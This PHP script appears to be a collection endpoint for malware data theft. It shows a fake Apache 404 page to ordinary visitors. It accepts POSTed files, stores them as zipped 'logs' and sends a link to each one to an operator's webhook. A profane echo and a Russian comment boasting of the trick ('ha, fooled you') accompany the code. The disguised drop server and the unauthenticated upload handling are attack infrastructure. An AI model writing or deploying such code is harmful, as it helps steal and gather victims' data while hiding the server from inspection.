<?php

    $UNKNOW_PAGE = "
    <html><head>
    <title>404 Not Found</title>
    </head><body>
    <h1>Not Found</h1>
    <p>The requested URL was not found on this server.</p>
    <hr>
    <address>Apache/2.4.25 (Debian) Server at plutonium.wtf Port 443</address>

    </body></html>
    ";

    echo "fuck" ;

    // ха наебал
    if( $_SERVER[ 'REQUEST_METHOD' ] != 'POST' ){
        echo $UNKNOW_PAGE;
        return;
    }

    $filepath = "/var/www/html/folder1/logs/" . basename( $_FILES['uploaded_file']['name']) . "_" . round(microtime(true) * 1000) . ".zip";

    if(move_uploaded_file($_FILES['uploaded_file']['tmp_name'], $filepath )) {
      echo "The file ".  basename( $_FILES['uploaded_file']['name']). " has been uploaded";

        $json_data = json_encode([
            "content" => "http://yourlink.com/folder1/logs/" . basename( $filepath )
        ]);
        $ch = curl_init( "webhook here" );
        curl_setopt( $ch, CURLOPT_HTTPHEADER, array('Content-type: application/json'));
        curl_setopt( $ch, CURLOPT_POST, 1);
        curl_setopt( $ch, CURLOPT_POSTFIELDS, $json_data);
        curl_setopt( $ch, CURLOPT_FOLLOWLOCATION, 1);
        curl_setopt( $ch, CURLOPT_HEADER, 0);
        curl_setopt( $ch, CURLOPT_RETURNTRANSFER, 1);

        $response = curl_exec( $ch );

        curl_close( $ch );
    } else{
        echo $_FILES['uploaded_file']['tmp_name'];
    }

?>